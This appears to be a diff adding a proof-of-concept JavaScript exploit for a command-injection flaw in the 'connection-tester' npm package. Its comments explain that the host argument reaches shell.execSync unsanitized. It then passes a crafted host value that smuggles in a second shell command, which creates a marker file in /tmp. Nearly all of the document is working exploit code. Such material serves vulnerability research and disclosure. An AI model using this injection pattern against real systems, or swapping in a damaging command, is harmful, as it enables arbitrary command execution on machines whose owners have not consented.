@@ -1,0 +1,19 @@
+```javascript
+// Exploit for connection-tester's shellOut/testSync sink (command injection).
+// index.js builds: `"${execPath}" "${scriptPath}" ${host} ${port} ${timeout}`
+// via util.format and passes it unsanitized to shell.execSync() -> host/port
+// are shell-interpreted, allowing arbitrary command injection.
+
+const connectionTester = require("connection-tester");
+
+// Malicious "host" breaks out of the intended argument list and runs
+// an arbitrary shell command (proof: creates a marker file).
+const maliciousHost = "127.0.0.1; touch /tmp/pwned_connection_tester #";
+
+// Calling test(host, port, timeout) with a numeric timeout and no callback
+// routes into the synchronous shellOut path (testSync -> shell.execSync).
+const result = connectionTester.test(maliciousHost, 80, 100);
+
+console.log("Result:", result);
+console.log("Check /tmp/pwned_connection_tester to confirm command injection.");
+```
